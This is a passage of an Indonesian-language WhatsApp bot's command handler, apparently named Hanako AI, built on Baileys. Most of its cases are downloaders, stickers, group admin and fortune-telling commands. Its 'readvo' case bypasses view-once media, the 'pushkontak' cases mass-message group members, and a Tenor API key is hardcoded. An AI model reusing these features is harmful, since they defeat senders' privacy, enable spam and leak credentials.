            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: mess.success
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: wm
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            })
          })
        }
      }
    }, {});

    await kyy.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await reply(mess.errorF);
  }
}
break
       case 'mediafire': {
       if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
  	if (!args[0]) return reply(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return reply(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    kyy.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
    case 'qc': {
    if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else m?.reply("Input teks atau replyq teks yang ingin di jadikan quote!")
if (!text) return m?.reply('masukan text')
if (text.length > 30) return m?.reply('Maksimal 30 Teks!')
let ppnyauser = await await kyy.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/440546854e464e04c1427.png')
const rest = await quote(text, pushname, ppnyauser)
kyy.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
    

         case "tts":
        {
        if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
          if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
          kyy.sendMessage(m?.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: "audio/mpeg",
          });
        }
        break;
                case 'tiktokstalk':{
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!q) return reply(`Example: ${prefix+command} username`)
kyy.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/tools/tiktokstalk?username=${q}`)
const nick = anu.result.name
const username = anu.result.username
const foll = anu.result.followers
const foli = anu.result.following
const desk = anu.result.description
await kyy.sendMessage(m.chat, { image: { url: anu.result.pp_user}, caption: `Name : ${nick}\nUsername : ${username}\nFollowers : ${foll}\nFollowing : ${foli}\nDescription : ${desk}`}, {quoted: m})
await kyy.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
reply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
}

break
case "rvo":
      case "readvo":
        {
          if (!m.quoted)
            return reply("Reply gambar/video yang ingin Anda lihat");
          if (m.quoted.mtype !== "viewOnceMessageV2")
            return reply("Ini bukan pesan view-once.");
          let msg = m.quoted.message;
          let type = Object.keys(msg)[0];
          let media = await downloadContentFromMessage(
            msg[type],
            type == "imageMessage" ? "image" : "video",
          );
          let buffer = Buffer.from([]);
          for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]);
          }
          if (/video/.test(type)) {
            return kyy.sendFile(
              m.chat,
              buffer,
              "media.mp4",
              msg[type].caption || "",
              m,
            );
          } else if (/image/.test(type)) {
            return kyy.sendFile(
              m.chat,
              buffer,
              "media.jpg",
              msg[type].caption || "",
              m,
            );
          }
        }
        break;
case "kalkulator":  
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
 if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
  break
//=================== G R O U P =====================//
case 'totag': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
kyy.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
let response = await kyy.groupInviteCode(from)
kyy.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'resetlinkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
kyy.groupRevokeInvite(from)
}
break
case 'sendlinkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await kyy.groupInviteCode(from)
kyy.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'kick': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyy.groupParticipantsUpdate(from, [users], 'remove')
reply(mess.done)
}
break
case 'add': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyy.groupParticipantsUpdate(from, [users], 'add')
reply(mess.done)
}
break
case 'promote': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyy.groupParticipantsUpdate(from, [users], 'promote')
reply(mess.done)
}
break
case 'demote': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyy.groupParticipantsUpdate(from, [users], 'demote')
reply(mess.done)
}
break
case 'hidetag': {
if (!isAdmins) return reply(`Khusus admin`)
if (!m.isGroup) return reply(mess.group)
await loading()
kyy.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:fcall})
}
break
case 'tagall': {
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
kyy.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:fcall })
}
break
case 'totalfeature':{
let totalf = `
*TOTAL FEATURE*

> • Total ${totalFitur()} Fitur\n> • Tipe : Case

Silahkan ketik *.menu* untuk
Menampilkan menu utama`
reply(totalf)
}
break
case 'closetime':
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
kyy.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
break
  
case 'opentime':
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
kyy.groupSettingUpdate(from, 'not_announcement')
m.reply(open)
}, timer)
break
//=================================================//
case 'hdr': case 'remini': case 'hd': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			kyy.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: fcall})
			}
			break
case 'getcase': {

const getCase = (cases) => {

            return "case "+`'${cases}'`+fs.readFileSync("./hanako.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isCreator) return reply('ngapain')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }
}
        break 
        
        case 'daftar': case 'regis': case 'register': {
if (isRegistered) return reply('Kamu sudah terdaftar')
const serialUser = createSerial(20)
mzd = `「 TERDAFTAR 」
*_SILAHKAN KETIK .MENU_*

- Nomor : @${m?.sender.split('@')[0]}
- Nama : ${pushname}
- Status : Sukses✅ 
- Serial : ${serialUser}

*Terimakasih Telah Daftar Di Hanako AI Kak ${pushname} Tenang Data Mu Tidak Akan Ter Share Ke mana mana Akan Tersimpam Di Database Doank Kok ,, Dan Jangan Lupa Baca Rules Ya*`
veri = m?.sender
if (!m.isGroup) {
addRegisteredUser(m?.sender, pushname, serialUser)
kyy.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `R E G I S T E R E D`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
} else {
addRegisteredUser(m?.sender, pushname, serialUser)
kyy.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | R E G I S T E R`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
}
break
        
case 'biochange': {
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'enable') {
                    autobio = true
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                } else if (q == 'disable') {
                    autobio = false
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                }
                }
                break   
case 'autobio': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *Hanako Ai* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`click button *enable* to enable autobio\nclick button *disable* to disable autobio`),
                    subtitle: "© Hanako AI",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".biochange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".biochange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'readchange': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Contoh ${prefix + command} enable/disable`)
if (q === 'enable') {
autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'disable') {
autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
}
break
case 'autoread': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "Hanako AI"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`click button *enable* to enable autoread\nclick button *disable* to disable autoread`),
                    subtitle: "© Hanako AI",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".readchange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".readchange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'pembayaran': case 'payment': case 'via': case 'nope': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Dana","id":"${prefix}dana"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Qris","id":"${prefix}qris"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"owner","id":"${prefix}owner"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: '12345678',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await kyy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await kyy.sendImageAsStickerAV(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kyy.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'public': {
if (!isCreator) return reply(mess.owner) 
kyy.public = true
reply('SUCCES PUBLIC KAK KYY')
}
break
case 'self': {
if (!isCreator) return reply(mess.owner) 
kyy.public = false
reply('SUCCES SELF KAK KYY')
}
break
case 'profile': case 'me': {
let limitz = db.data.users[m.sender].limit;
let sender = m.sender;
    let ppUrl = await kyy.profilePictureUrl(sender, 'image').catch((_) => "https://telegra.ph/file/34d343582a1cf8f830a28.jpg");
    let pp = await (await fetch(ppUrl)).buffer();

    let yyye = `
—  *P R O F I L E*

┌  ◦  *Name* : ${pushname}
│  ◦  *Nomer* : @${m?.sender.split('@')[0]}
│  ◦ *Terdaftar* : Yes
│  ◦  *Status User* : ${isCreator ? 'Premium' : 'Free'}
│  ◦  *Saldo* : Rp${toRupiah(cekSaldo(sender, db_saldo))}_
└  ◦  *Limit* : ${limitz}

*_KETIK .MENU MENAMPILKAN BUTTON LIST_*
*_KETUK BUTTON DAN DISPLAY ALLMENU_*
*_KETIK .OWNER MELIHAT KONTAK OWNER_*
    `.trim();

await kyy.sendMessage(m.chat, {
text: yyye,
contextInfo: {
externalAdReply: {  
title: 'ᴄʀᴇᴀᴛᴇᴅ ʙʏ BintzGE',
body: `BintangBotzMD`,
thumbnailUrl: ppUrl,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted:m})
}
break
        case "upsw": {
          if (!isCreator) return reply("Owners only");
          if (args.length < 1) return reply("perihal apa?");
          if (/image/.test(mime)) {
            let imgSw = await kyy.downloadAndSaveMediaMessage(quoted);
            await kyy.sendMessage(
              "status@broadcast",
              { image: { url: imgSw }, caption: q },
              { statusJidList: pendaftar },
            );
            reply("Udah Hiyuu, Liat Aja Kalo Ga Percaya 😋");
          } else if (/video/.test(mime)) {
            let VidSw = await kyy.downloadAndSaveMediaMessage(quoted);
            await kyy.sendMessage(
              "status@broadcast",
              { video: { url: VidSw }, caption: q },
              { statusJidList: pendaftar },
            );
            reply("Done");
          } else if (/audio/.test(mime)) {
            let VnSw = await kyy.downloadAndSaveMediaMessage(quoted);
            await kyy.sendMessage(
              "status@broadcast",
              { audio: { url: VnSw }, mimetype: "audio/mp4", ptt: true },
              { backgroundColor: "#d3d3d3", statusJidList: pendaftar }, // #d3d3d3
            );
            reply("Done");
          } else if (q) {
            kyy.sendMessage(
              "status@broadcast",
              { text: q },
              {
                backgroundColor: "#FF000000",
                font: 3,
                statusJidList: pendaftar,
              },
            );
          } else {
            reply(
              "Replay Media Jika Mau Dengan Caption Ketik .upsw caption",
            );
          }
        }
        break;
        
      case "listsw": {
          if (!isCreator) return reply("Perihal Apa?")
          if (!store.messages["status@broadcast"].array.length === 0)
            throw "Gaada 1 status pun";
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) throw "Status gaada";
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? kyy.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await kyy.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await reply(text.trim(), { mentions: Object.keys(result) });
        }
        break;
case 'emojimix': { 
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ ᴏʟᴇʜ ᴋʏʏ')
await loading()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await kyy.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'gcbot': {
reply(`- Gc Utama
https://chat.whatsapp.com/I9mpo2iIuadBdkee7EZnz4`)
await kyy.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/gcbot.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
//=================================================//
case 'emojimix2': {
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ ᴏʟᴇʜ ᴋʏʏ')
await loading()
 if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await kyy.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) return m.reply('*ʟᴜ ᴅɪ ʙᴀɴ')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ')
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 kyy.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
case 'pushkontak2':{
if (!isCreator) return reply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await kyy.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
kyy.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;
case 'pushkontak':{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`di group coy`)
if (!text) return reply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
kyy.sendMessage(geek, {text: `${teksnye}`}, {quoted:fcall})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case 'text2img': {
  if (isBan) return reply(mess.bann)
  if (!text) return reply(`Example: ${prefix + command} Cat`)
  // Check if the version is between 1 and 7
  const versionRegex = /^v[1-7]$/;
  if (args[0] && versionRegex.test(args[0])) {
    reply(mess.wait)
    let cap = `${mess.success}`
    let imgg;

    switch (args[0]) {
      case 'v1':
        imgg = `https://aemt.me/ai/text2img?text=${text}`;
        break;
      case 'v2':
        imgg = `https://aemt.me/v1/text2img?text=${text}`;
        break;
      case 'v3':
        imgg = `https://aemt.me/v2/text2img?text=${text}`;
        break;
      case 'v4':
        imgg = `https://aemt.me/v3/text2img?text=${text}`;
        break;
      case 'v5':
        imgg = `https://aemt.me/v4/text2img?text=${text}`;
        break;
      case 'v6':
        imgg = `https://aemt.me/v5/text2img?text=${text}`;
        break;
      case 'v7':
        imgg = `https://aemt.me/v6/text2img?text=${text}`;
        break;
    }

    kyy.sendMessage(from, { image: { url: imgg }, caption: cap }, { quoted: m });
    return;
  }

  let sections = [
    {
      title: 'Text To Image',
      rows: [
        { title: 'Version 1', description: `Text To Image Version 1`, id: `${prefix}text2img v1 ${text}` },
        { title: 'Version 2', description: `Text To Image Version 2`, id: `${prefix}text2img v2 ${text}` },
        { title: 'Version 3', description: `Text To Image Version 3`, id: `${prefix}text2img v3 ${text}` },
        { title: 'Version 4', description: `Text To Image Version 4`, id: `${prefix}text2img v4 ${text}` },
        { title: 'Version 5', description: `Text To Image Version 5`, id: `${prefix}text2img v5 ${text}` },
        { title: 'Version 6', description: `Text To Image Version 6`, id: `${prefix}text2img v6 ${text}` },
        { title: 'Version 7', description: `Text To Image Version 7`, id: `${prefix}text2img v7 ${text}` },
      ]
    }
  ];

  let listMessage = {
    title: 'List Menu',
    sections
  };

  let msg = generateWAMessageFromContent(from, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Silahkan pilih *option* di bawah ini`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: wm
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: ``,
            gifPlayback: true,
            subtitle: ownername,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(listMessage)
              }
            ],
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterName: saluran,
              newsletterJid: '6288286326619',
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, {});

  await kyy.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
}
break
case "cekidgc": {
